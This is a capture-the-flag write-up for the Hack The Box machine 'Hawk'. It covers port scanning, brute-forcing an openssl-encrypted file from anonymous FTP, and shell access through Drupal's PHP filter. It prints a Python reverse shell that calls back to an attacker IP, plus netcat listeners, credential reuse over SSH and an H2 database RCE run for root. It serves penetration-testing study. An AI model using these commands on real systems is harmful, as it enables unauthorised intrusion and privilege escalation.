# Hawk [HTB](https://app.hackthebox.com/machines/146)
![hawk-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/hawk-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 hawk.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/ports-02.png)


From here I run a software and version detection scan on the found ports:

```bash
nmap -p 21,22,80,5435,8082,9092 -sCV hawk.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/nmap-res-03.png)

![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/nmap-res-04.png)


We have the following:

+ An FTP server on port 21.
+ An SSH server on port 22.
+ An Apache/2.4.29 server on port 80.
+ A "tcpwrapper" service on port 5435.
+ An H2 database console on port 8082.
+ An "XmlIpcReSvc" service on port 9092.


Based on `nmap`'s HTTP probing scripts, we can see the presence of a `robots.txt` file which restricts web crawlers from accessing several interesting directories and files on the website. The website itself seems to be powered by `Drupal 7`. 


Then, we have what looks like a database web-console on port 8082. A quick google search reveals that [H2](https://en.wikipedia.org/wiki/H2_(database)) is a relational database system written in Java. We will take a look at this service later on.


Next, we have the "tcpwrapper" service on port 5432, and the unidentified servcie of `XmlIpcRegSvc` running on port 9092. I got conflicting results based on my google searches of these two ports, most sites say that port `5432` is related to `postgresql`, and that port `9092` could be realted to Citrix. But at the end, they are both related to the `H2` system (I came to find that after solving this box). 


Finally, we have the FTP server which allows for anonymous logins running on port 21. I think we should start with the FTP server and see which files we can retrieve. Then we can move on to test the Apache server on port 80 and move on from there. 


### FTP Port 21

If we login to the FTP server we will find a single directory of `messages` which looks empty:

![ftp-empty-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/ftp-empty-05.png)


Trying to write a file onto the FTP server results in insufficient permissions error:

![ftp-denied-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/ftp-denied-06.png)


As a last resort, I decided to try and retrieve whatever is on the FTP server using this one liner:

```bash
wget -m ftp://anonymous:anonymous@hawk.htb
```

Which resulted in a hidden file: 

![hidden-06.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/hidden-06.5.png)


(A remainder to always run `ls -a` to list any hidden files)


This file seems to be an `openssl` encrypted cipher text:

![enc-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/enc-07.png)


This cipher text was made using the [enc module of openssl](https://www.openssl.org/docs/man1.1.1/man1/enc.html) and in order to crack it, we first need to identify with which algorithm it was encrypted.


Let's start by checking the length of the actual cipher text after base64 decoding it and saving it to a file along the way:

```bash
base64 -d .drupal.txt.enc > drupal.enc | tee | wc -c 
```

![wc-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/wc-08.png)


The actual cipher text is `176` bytes long. 176 divides by 8 with no remainder, which suggest that it may have been encrypted using some sort of block cipher technique, [source](https://en.wikipedia.org/wiki/Block_size_(cryptography)).


If we list out the possible encryption algorithms supported by openssl using `openssl enc -ciphers`, we get a fairly long list, with three entries per line. We first need to get a list of the encryption algorithms one per line before starting to reduce them. I use the following command to achieve that:

```bash
for i in $(openssl enc -ciphers);do echo $i >> cipher.list;done
```

Then, I reduce the list by greping for block based ciphers as such:

```bash
grep cb cipher.list > cipher.lst
rm cipher.list
```

It's a bit clunky, but it givs me a list of 38 possible block based encryption algorithms in a list we can iterate on. But how can we use this list to identify the possible encryption algorithm used in our target file? To answer this question we need to understand a simple concept:


Block based encryption relies on padding to reach the length of the block in order to perform the encryption. This means that the actual clear-text message is either smaller then 176 bytes, or 176 bytes exactly. We can use this knowlegde to our advantage and perform a simple test. 


We can create files with varied lengths, and encrypt them all using every encryption algorithm in our list. This in theory, should adjust the files size via padding, in order to match the block length required by the encryption algorithm used. We can then grep for files who have been encrypted with an algorithm which gave them a final length of `176` bytes, thus giving us a stronger indication of the possible encryption algorithm used on our target file.



To do this, I create a dedicated directory which I cd into, and create the test files as such:

```bash
mkdir encryption; cd encryption; mv ../cipher.lst .
for sample in $(seq 0 8 176); do python -c "print 'A'*$sample" > $sample; done
```


This should have created 24 new files in your working directory.


Now we can use the following bash script to encrypt them using each cipher algorithm in our list:

```bash
#!/bin/bash
for cipher in $(cat cipher.lst); do
    for sample in $(seq 0 8 176); do
        openssl enc -$cipher -e -in $sample -out $sample$cipher.enc -k htb
    done
done
```


After running this script I have a bunch of files in my encryption directory. Let's see which of the files got to the length of `176` using:

```bash
ls *.enc | xargs wc -c | grep '176 '
```

![xargs-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/xargs-09.png)


This is only a part of the result, as it's quite long, too long for sure. But if you pay attention, there are encryption algorithms which endded up with a final cipher-file size of `176` bytes even againts different clear-text files with varied lengths. 


For example, take a look at `aes-128-cbc`, with a clear-text of `144` bytes, as well `152` bytes, it endded up with a cipher text length of `176`. This makes this it a strong candidate. 


I take all such algorithms who gave a cipher text length of `176` with more then one input clear-text file length, and I reach the final list:

```bash
-aes-128-cbc
-aes-128-ecb
-aes-192-cbc
-aes-192-ecb
-aes-256-cbc
-aes-256-ecb
-aria-128-cbc
-aria-128-ecb
-aria-192-cbc
-aria-192-ecb
-aria-256-cbc
-aria-256-ecb
-camellia-128-cbc
-camellia-128-ecb
-camellia-192-cbc
-camellia-192-ecb
-camellia-256-cbc
-camellia-256-ecb
-seed-cbc
-seed-ecb
-sm4-cbc
-sm4-ecb
```

It's not as short as I hoped it will be (one line :D), but it's still better then the original 100+ list of `openssl`. Now it's time to start cracking! 


For this, I use the [bruteforce-salted-openssl](https://github.com/glv2/bruteforce-salted-openssl) tool from `glv2`. For some reason, I had issues with the `make` file when I was trying to compile it myself, so I endded up downloading it from an apt repository with `https://github.com/glv2/bruteforce-salted-openssl`.


Once I have the tool installed on my attack machine, I go through each and every encryption algorithm in my list, and try to crack the encrypted file againts `rockyou.txt`. I make sure to add the `-d sha256` switch, since it's needed by the tool and it's the default message digest of `openssl`, [source](https://www.openssl.org/docs/man1.1.1/man1/dgst.html).


After a bit of trail and error I mange to crack it againts an `aes-256-cbc` encryption:

```bash
bruteforce-salted-openssl -t 30 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 drupa.enc
```

![pass-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/pass-10.png)


We can then use `openssl` to decrypt the file as such:

```bash
openssl enc -aes-256-cbc -d -in drupa.enc -out clear.txt -k friends
```

Which gives us the clear-text file:

![file-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/file-11.png)


And now we have credentials to work with! 


### Apache Port 80.

If we browse towards `http://hawk.htb/` we get the Drupal login page:

![site-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/site-12.png)


I supply the credentials of `admin : PencilKeyboardScanner123` and I login:

![drupal-admin-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/drupal-admin-13.png)


I also try to login as `Daniel` via SSH using this password but no luck.


Once inside, we wont find much of interest, Instead I wanted to try and find the exact version of Drupal used by this server in order to find exploits. I remember from the `nmap` scan that the `robots.txt` file had an entry of `/CHANGELOG.txt`.


If we open this file we see the exact version is `7.58`:

![version-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/version-14.png)


This prevents us from using the [Drupalgeddon2 RCE exploit](https://www.exploit-db.com/exploits/44449), which was patched by `7.58`.


What we can do instead, is use the use the PHP filter module to add a reverse shell payload:

![module-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/module-15.png)


Make sure to enable this module, scroll all the way to the button, and click on the `Save Configuration` button:

![save-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/save-16.png)


Which should give you this reassuring message:

![msg-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/msg-17.png)


Then, click on `Add content`, select `Basic Page` or `Article`, and add a reverse shell payload:

![payload-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/payload-18.png)


At this point exactly, start your local listener with:

```bash
rlwrap nc -lnvp 443
```

And finally, select `PHP code` in `Text Format` and hit the `Preview` button to execute the code:

![preview-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/preview-19.png)


Which should give you a shell:

![shell-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/shell-20.png)


## Privilege Escalation


Once I get the on a shell I upgrade it using:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I try to list any sudo permissions but I get prompted for credentials. So instead, I start looking around the filesystem. 


I know that there should be a sensetive file of `settings.php` in Drupal installations which can contain credentials. After a bit of digging, I found the file at `/var/www/html/sites/default/settings.php`. 


If we look inside the `settings.php` file, we will see credentials to the mySQL database:

![db-creds-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/db-creds-21.png)


We can use these creds to connect to the MySQL database using something like this: 

```bash
mysql -u drupal --password='drupal4hawk'
```

But this wont be much of help since we already have the password for the Drupal admin, and there isn't much else of interest to be found in the database, (I looked).


Instead, we can try to reuse the password as `daniel`'s SSH password:

![daniel-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/daniel-22.png)


Which works! 


### Daniel 

After connecting via the SSH, we get what looks like a python shell. If we use our previous shell as `www-data` and take a look at the `/etc/passwd` file, we can see that `daniel` has `python3` set as it's shell:

![etc-passwd-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/etc-passwd-23.png)


So In order to get a normal `/bin/bash` shell, I start another listener on my attack machine with:

```bash
rlwrap nc -lnvp 445
```

Then, I use this simple Python reverse shell sequence:

```python
>>> import socket,os,pty
>>> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
>>> s.connect(("10.10.14.89",445))
>>> os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```

![python-rshell-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/python-rshell-24.png)


Which gives me a normal shell:

![normal-shell-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/normal-shell-25.png)


Though there are other techniques that don't require a new connection like:

```python
>>> import pty
>>> pty.spwan('/bin/bash')
```

Or 

```python
>>> import subprocess
>>> subprocess.call('/bin/bash', shell=True)
```


After landing on this shell, I try to list out any sudo permissions but we have none. I try to look around `daniel`'s home directory, but there is nothing useful there. 


So instead, I start looking around the filesystem, in the `/opt` directory I find two interesting programs:

![opt-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/opt-26.png)


Here is the overview:

+ `lshell`

The `lshell` acronym stands for [Limited shell](https://github.com/ghantoos/lshell) which is a restrictive shell environment coded in python. Not super useful for us at the moment. 


+ `h2`

This is the service we saw running on port 8082 in our initial `nmap` scan. Trying to access this port from our web-browser returns the following message:

![sorry-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/sorry-27.png)


We have to access it from the localhost interface of the target. We can do that with a simple SSH tunnel using `daniel`'s password. The question is, will it help us get root? 


If we list out the running processes on the system using `ps auxww` we see the following:

![ps-aux-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/ps-aux-28.png)


This looks like a cronjob, but at any case, `root` is the one running the `h2` database service on the system. Therefore, if we can find a way to get RCE from this H2 database we root the box. 


Let's start by forwarding the 8082 port from the target over to our attack machine using a simple SSH tunnel:

```bash
ssh -N -L 8082:localhost:8082 daniel@hawk.htb
```

![tunnel-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/tunnel-29.png)


This stalls the shell which is a good sing that the tunnel has been established. However, it's best to verify it by listing the open ports on our attack machine:

```bash
netstat -nlt | grep 8082
```

![local-port-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/local-port-30.png)


Nice! Now we should be able to access the `H2` service by browsing towards `http://localhost:8082`:

![h2-interface-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/h2-interface-31.png)


### H2 Access

I did a bit of google searching, and I found the [following RCE exploit](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed) againts the H2 database system. But in order to pull it off we need to connect to a database supplying valid credentials. 


We already have credentials to the `drupal` database from the previous steps, so I try to connect to this database here:

![connected-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/connected-32.png)


It worked!! 


Next, I download the exploit to my attack machine and add the correct passwrod for the authintication: 

![add-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/add-33.png)


Then, I run it as such:

```bash
python3 h2-rce.py -H 127.0.0.1:8082 -d jdbc:h2:~/drupal
```

And I get a shell as root:

![root-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Hawk/img/root-34.png)
